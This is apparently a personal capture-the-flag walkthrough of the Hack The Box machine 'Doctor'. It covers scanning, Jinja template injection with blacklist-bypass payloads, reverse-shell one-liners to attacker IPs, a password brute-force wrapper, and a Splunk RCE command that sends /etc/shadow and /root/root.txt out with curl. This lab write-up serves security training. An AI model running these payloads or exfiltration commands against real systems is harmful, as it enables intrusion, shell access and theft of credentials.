---
tags: [HTB]
title: Doctor
created: '2020-11-10T17:29:29.444Z'
modified: '2020-12-19T00:05:26.792Z'
---

# Doctor

- Perform NMAP scan on IP address

``` bash
root@kali:~/Downloads/hackthebox/doctor# cat nmap.txt 
# Nmap 7.80 scan initiated Tue Nov 10 12:20:42 2020 as: nmap -Pn -sV -p- -oN nmap.txt 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
8089/tcp open  ssl/http Splunkd httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Looks like its running a web server on port 80
  - Apache version looks up to date (no exploit here) but might be something of interest in web page

- Searchsploit reveals authenticate splunk RCE
> Splunk RCE requires creds if not using default creds

- SSH looks up to date (nothing here)

``` bash
root@kali:~/Downloads/hackthebox/doctor# searchsploit  splunk
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Splunk - Remote Command Execution                    | multiple/remote/18245.py
Splunk 4.1.6 - 'segment' Cross-Site Scripting        | multiple/remote/36246.txt
Splunk 4.1.6 Web Component - Remote Denial of Servic | multiple/dos/36247.txt
Splunk 4.3.1 - Denial of Service                     | multiple/dos/38038.txt
Splunk 4.3.3 - Arbitrary File Read                   | multiple/webapps/21053.txt
Splunk 5.0 - Custom App Remote Code Execution (Metas | multiple/remote/23224.rb
Splunk 6.1.1 - 'Referer' Header Cross-Site Scripting | php/webapps/40997.txt
Splunk < 7.0.1 - Information Disclosure              | linux/webapps/44865.txt
Splunk Enterprise - Information Disclosure           | multiple/webapps/41779.txt
Splunk Enterprise 6.4.3 - Server-Side Request Forger | multiple/webapps/40895.py
Splunk Enterprise 7.2.3 - (Authenticated) Custom App | windows/webapps/46238.py
Splunk Enterprise 7.2.4 - Custom App Remote Command  | windows/webapps/46487.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

## Notes
- Running splunk Universal Forwarder on port 8089
- By default remote authentication with default credentials is not allowed
> however, if the username or password is changed and we know it then we can authenticate remotely
- Write custom bash script to essentially bruteforce executing the payload iterating the password each time untill the correct password is found.

- Write custom shell script to find creds for RCE 


```bash
#!/bin/bash

username=Admin

#------------Handles Flag Arguments--------
while getopts w:s:h:p:l: flag
do
    case "${flag}" in
        w) wordlist=${OPTARG};;
        s) script=${OPTARG};;
        p) port=${OPTARG};;
        h) host=${OPTARG};;
        l) localhost=${OPTARG};;
        #h) help=${OPTARG};;
    esac
done


#------------Check for arguments----------
if [ "$#" -lt 5 ]
  then
    echo "
                                    [-p Port]
                                    [-l Local host]
                                    [-h Remote host]
                                    [-s Script]
                                    [-w Password List]"
fi

#------------Read Word List-----------------
while read line;
do
        #echo "Trying Username:$username Password:$line"
        python $script --host $host --port $port --username $username --password $line --lhost $localhost --payload 'curl -F "data=@/etc/shadow" http://LocalIP:Port'                                                
                                                                                                             
done < $wordlist

```

- This script didn't work 
- Webpage shows an email addres info@doctors.htb
> This gives us a domain we can point to
> Update /etc/hosts to point to domain
- Brings us to a login page
  - We can register an account and post messages
  - Potentially SQL injection or XSS?
- Found a /archive page with dirbuster
- tried some simple template injection oayloads "{7*7}"
> returned 49 in /archive source code -  this tells me it is executing code
> fuzzing allows me to figure out this is jinja and not Smarty etc

## Jina Template Injection
- Inject command into title of message
  - View source of archive page http://doctors.htb/archive and code will have been executed



```js
{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/bash 10.10.14.162 1234').read()}}
```
```js
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
- tried these but they didn't work
```js
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.162/1234 0>&1"',shell=True) }}

```
- This might have worked but this filter stopped it

- Needed to bypass blacklist filter of ``` "/ | . _ ' ```
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

```js
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
- This command worked
- After some enumeration i found multiple versions of nc to get reverse shell
  - Usual nc did not work but found nc.openbsd
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat
- Found payload to get reverse shell with openbsd of nc

```js
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('/usr/bin/nc.openbsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.98 1234 >/tmp/f')|attr('read')()}}

```
- Got reverse shell from paylaod
- Ran Linpeas and linux exploit suggester which did not return anything for priviledge escalation tactics
- sudo -L returned nothing
- Knew i needed creds for splunk RCE 
> enumeration found a backup file which is not normally found in apache2 directory - a quick grep of the file found a juicy password 
- Using su i switched to the Shaun user to test the password i found which worked!!

```bash
cat /var/log/apache2/backup | grep password


10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"

```

- Splunk RCE for priviledge escalation 
- Splunk is running at root so can access /root directory

``` bash

python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.15.26  --username shaun --password Guitar123 --payload "curl -F 'data=@/root/root.txt' http://10.10.15.26:1234"


```



